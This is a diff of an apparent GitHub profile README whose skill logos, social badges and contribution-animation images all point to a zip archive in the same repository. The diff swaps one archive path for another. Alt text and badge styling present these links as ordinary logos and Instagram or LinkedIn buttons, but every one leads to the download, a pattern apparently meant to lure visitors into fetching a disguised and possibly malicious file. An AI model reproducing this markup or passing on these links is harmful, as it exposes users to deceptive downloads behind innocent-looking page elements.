@@ -15,63 +15,63 @@
 ###
 
 <div>
-  <a href="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip">
-  <img height="180em" src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip"/>
-  <img height="180em" src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip"/>
+  <a href="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip">
+  <img height="180em" src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip"/>
+  <img height="180em" src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip"/>
 </div>
 
 <h2 align="left">Skills</h2>
 <div align="left">
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="javascript logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="javascript logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="react logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="react logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="nextjs logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="nextjs logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="nodejs logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="nodejs logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="amazonwebservices logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="amazonwebservices logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="angularjs logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="angularjs logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="arduino logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="arduino logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="css3 logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="css3 logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="csharp logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="csharp logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="docker logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="docker logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="git logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="git logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="html5 logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="html5 logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="java logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="java logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="mysql logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="mysql logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="php logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="php logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="python logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="python logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="typescript logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="typescript logo"  />
   <img width="12" />
-  <img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" height="40" alt="postgresql logo"  />
+  <img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" height="40" alt="postgresql logo"  />
 </div>
   
   ##
  
 <div>
-  <a href="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" target="_blank"><img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip%23E4405F?style=for-the-badge&logo=instagram&logoColor=white" target="_blank"></a>
- 	<a href="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" target="_blank"><img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" target="_blank"></a>
-  <a href = "https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip"><img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" target="_blank"></a>
-  <a href="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip" target="_blank"><img src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip%230077B5?style=for-the-badge&logo=linkedin&logoColor=white" target="_blank"></a>   
+  <a href="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" target="_blank"><img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip%23E4405F?style=for-the-badge&logo=instagram&logoColor=white" target="_blank"></a>
+ 	<a href="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" target="_blank"><img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" target="_blank"></a>
+  <a href = "https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip"><img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" target="_blank"></a>
+  <a href="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip" target="_blank"><img src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip%230077B5?style=for-the-badge&logo=linkedin&logoColor=white" target="_blank"></a>   
 </div>
 
 
 
 <picture align="center">
-  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip">
-  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip">
-  <img align="center" alt="github contribution grid snake animation" src="https://raw.githubusercontent.com/MZMozart/MZMozart/main/Aecidiaceae/MZMozart.zip">
+  <source media="(prefers-color-scheme: dark)" srcset="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip">
+  <source media="(prefers-color-scheme: light)" srcset="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip">
+  <img align="center" alt="github contribution grid snake animation" src="https://github.com/MZMozart/MZMozart/raw/refs/heads/main/.github/MZ_Mozart_2.1.zip">
 </picture>
